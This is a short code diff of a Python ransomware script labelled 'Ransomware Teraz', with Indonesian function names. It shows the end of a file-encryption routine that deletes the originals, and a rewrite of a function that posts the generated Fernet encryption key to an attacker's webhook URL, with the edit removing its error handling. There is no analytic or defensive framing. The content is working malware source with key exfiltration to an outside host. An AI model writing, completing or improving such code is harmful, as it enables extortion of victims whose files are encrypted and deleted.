@@ -16,16 +16,12 @@ def enkripsi_file(file_path, key):
     os.remove(file_path)
 
 def kirim_kunci_ke_webhook(key):
-    try:
-        payload = {
-            "content": f"KEY: {key.decode()}",
-            "username": "Ransomware Teraz"
-        }
-        response = requests.post(WEBHOOK_URL, json=payload)
-        if response.status_code != 204:
-            print(f"Failed to send key: {response.status_code}")
-    except Exception as e:
-        print(f"Error sending key to webhook: {e}")
+    payload = {
+        "content": f"KEY: {key.decode()}",
+        "username": "Ransomware Teraz"
+    }
+    
+    requests.post(WEBHOOK_URL, json=payload)
 
 key = Fernet.generate_key()
 
